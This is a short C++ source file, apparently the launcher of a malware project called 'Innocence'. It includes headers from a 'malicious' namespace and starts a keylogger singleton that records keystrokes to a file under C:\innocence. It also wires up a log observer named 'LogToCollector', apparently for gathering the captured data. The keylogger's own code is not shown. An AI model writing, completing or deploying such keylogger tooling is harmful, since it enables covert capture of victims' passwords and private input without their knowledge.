#include <log/Log.hpp>
#include <malicious/Keylogger.hpp>
#include <system/Process.hpp>
using namespace System;
using namespace Malicious;

#include <common/Innocence.hpp>

int main()
{
    TRACE_FUNCTION
	LOG.setIdentity(Common::identity);
    LOG.addObserver(new Log::LogToConsole);
    LOG.addObserver(new Log::LogToCollector);
    Keylogger::instance().setKeylog("C:\\innocence\\output.txt");
    Keylogger::instance().start();
	system("pause");
	return EXIT_SUCCESS;
}
